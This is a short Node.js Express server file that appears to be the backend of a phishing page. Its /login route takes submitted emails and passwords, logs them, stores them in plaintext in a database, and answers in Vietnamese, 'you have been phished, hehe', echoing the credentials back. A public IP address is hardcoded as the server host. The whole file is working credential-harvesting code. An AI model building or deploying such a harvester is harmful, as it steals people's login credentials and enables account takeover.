// server.js
const express = require('express');
const path = require('path');
const { Sequelize } = require('sequelize');
const User = require("./users.model")
const app = express();
const port = 8080;
const host = '54.255.165.241'
app.use(express.json())


// Set up Pug as the template engine
app.set('view engine', 'pug');
app.set('views', path.join(__dirname, 'views'));


// Serve static files from 'public' directory
app.use(express.static(path.join(__dirname, 'public')));


// Routes
app.get('/', (req, res) => {
  res.render('index');
});

app.post("/login", async (req, res, next) => {
  const { email: username, password } = req.body
  if (!username || !password) return;
  console.log("HIT", req.body)

  await User.create({
    username, password
  })

  return res.status(200).json({
    message: "Ban da bi phishing hjhj",
    payload: req.body
  })
})

app.listen(port, () => {
  console.log(`Server running at http://${host}:${port}`);
});